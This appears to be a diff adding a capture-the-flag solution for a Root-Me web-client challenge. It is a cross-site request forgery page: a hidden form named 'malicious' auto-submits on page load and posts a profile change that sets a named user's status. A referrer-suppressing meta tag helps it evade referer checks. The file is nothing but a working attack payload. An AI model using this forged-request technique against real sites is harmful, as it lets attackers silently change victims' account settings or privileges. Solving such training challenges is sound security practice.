@@ -1,0 +1,24 @@
+<html lang="en">
+<head>
+    <meta name="referrer" content="never">
+</head>
+<body>
+    <form id="malicious" action="http://challenge01.root-me.org/web-client/ch22/?action=profile" method="post" enctype="multipart/form-data">
+		<div class="form-group">
+		<label>Username:</label>
+		<input type="text" name="username" value="ilias.lereverend">
+		</div>
+		<br>		
+		<div class="form-group">
+		<label>Status:</label>
+		<input type="checkbox" name="status" checked>
+		</div>
+		<br>	
+		<button type="submit">Submit</button>
+		</form>
+    
+     <script>
+        document.getElementById('malicious').submit();
+     </script>
+</body>
+</html>
